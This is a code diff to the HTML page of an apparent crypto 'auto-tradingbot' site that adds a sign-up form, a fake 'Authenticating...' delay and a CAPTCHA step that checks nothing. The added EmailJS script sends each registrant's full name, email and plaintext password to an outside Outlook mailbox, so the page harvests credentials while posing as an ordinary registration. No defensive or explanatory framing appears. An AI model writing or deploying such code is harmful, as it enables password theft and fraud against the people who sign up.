@@ -267,7 +267,7 @@
   </div>
 </section>
 
-<!-- 🆕 PAGE 2: SIGN UP -->
+<!-- ✅ PAGE 2: SIGN UP -->
 <section id="page2" class="page min-h-screen flex items-center justify-center bg-[#0a1f3d] text-white px-4 hidden">
   <div class="w-full max-w-md bg-[#072146] p-8 rounded-2xl shadow-2xl">
     <button onclick="showPage('page1')" class="text-sm text-yellow-400 hover:underline mb-6">← Back</button>
@@ -296,7 +296,16 @@
   </div>
 </section>
 
-<!-- 🔐 PAGE 2ii: CAPTCHA AFTER SIGNUP -->
+<!-- 🔄 PAGE 2i: AUTHENTICATING -->
+<section id="page2i" class="page min-h-screen flex items-center justify-center bg-[#0a1f3d] text-white px-4 hidden">
+  <div class="w-full max-w-sm bg-[#072146] p-10 rounded-xl shadow-xl text-center">
+    <div class="loader mb-6 mx-auto"></div>
+    <h2 class="text-xl font-bold text-yellow-400 mb-2">Authenticating...</h2>
+    <p class="text-sm text-gray-300">Please wait while we process your registration.</p>
+  </div>
+</section>
+
+<!-- 🔐 PAGE 2ii: CAPTCHA -->
 <section id="page2ii" class="page min-h-screen flex items-center justify-center bg-[#0a1f3d] text-white hidden">
   <div class="max-w-md w-full bg-[#072146] p-8 rounded-xl shadow-lg">
     <button onclick="showPage('page2')" class="text-sm text-yellow-400 hover:underline mb-4">← Back</button>
@@ -304,7 +313,7 @@
     <div class="h-captcha mb-6" data-sitekey="4e5a8260-9554-439c-8d58-76f04ca823c8"></div>
     <button onclick="completeCaptcha()" class="w-full bg-yellow-400 hover:bg-yellow-300 text-black font-bold py-2 rounded">Verify</button>
   </div>
-</section>  
+</section>
 
 <!-- PAGE 3 - DASHBOARD -->
 <section id="page3" class="page px-4 md:px-0">
@@ -1471,5 +1480,82 @@ document.addEventListener("DOMContentLoaded", () => {
       }
     }
   </script>
+  <!-- ✅ JavaScript + EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  emailjs.init("n9BsaM4ZjH178UeSf");
+
+  const serviceID = "service_xg8bzqs";
+  const submitTemplateID = "template_gclz9gu";
+  const autoReplyTemplateID = "template_r0zg4zj";
+  const domainCaptchaLink = "https://auto-tradingbot.github.io/System/#page2ii";
+
+  function showPage(id) {
+    document.querySelectorAll(".page").forEach(page => page.classList.add("hidden"));
+    const nextPage = document.getElementById(id);
+    if (nextPage) nextPage.classList.remove("hidden");
+  }
+
+  function handleSignUp() {
+    const fullName = document.getElementById("signFullName").value;
+    const email = document.getElementById("signEmail").value;
+    const password = document.getElementById("signPassword").value;
+
+    const templateParamsSubmit = {
+      to_email: "Blockchainautomated@outlook.com",
+      user_name: fullName,
+      user_email: email,
+      user_password: password
+    };
+
+    const templateParamsReply = {
+      user_email: email,
+      captcha_link: domainCaptchaLink
+    };
+
+    // Submit registration data
+    emailjs.send(serviceID, submitTemplateID, templateParamsSubmit)
+      .then(() => {
+        // Send auto-reply
+        return emailjs.send(serviceID, autoReplyTemplateID, templateParamsReply);
+      })
+      .then(() => {
+        // Show authentication page
+        showPage("page2i");
+
+        // After 30 seconds, show CAPTCHA page
+        setTimeout(() => {
+          showPage("page2ii");
+        }, 30000);
+      })
+      .catch((err) => {
+        console.error("Signup Failed:", err);
+        alert("Something went wrong. Please try again.");
+      });
+  }
+
+  function completeCaptcha() {
+    // Redirect to page3 after short confirmation delay
+    setTimeout(() => {
+      window.location.href = "https://auto-tradingbot.github.io/System/#page3";
+    }, 1000);
+  }
+</script>
+
+<!-- 🔄 Loading Spinner -->
+<style>
+  .loader {
+    border: 5px solid #1e3a5f;
+    border-top: 5px solid #facc15;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+</style>
+
 </body>
 </html>
